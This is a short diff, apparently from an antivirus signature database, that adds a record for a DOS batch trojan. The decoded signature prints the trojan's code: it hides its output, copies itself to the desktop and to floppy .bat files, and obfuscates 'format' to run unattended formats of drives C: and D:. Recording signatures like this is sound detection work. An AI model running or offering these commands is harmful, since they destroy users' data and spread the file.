@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36603
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ctty nul copy %0 %windir%\dektop\love.bat copy %0 a:\*.bat set as=rm set ff=test fo%as%at c: /u /q /auto%test% fo%as%at d: /u /q /auto%test% set as= set ff=
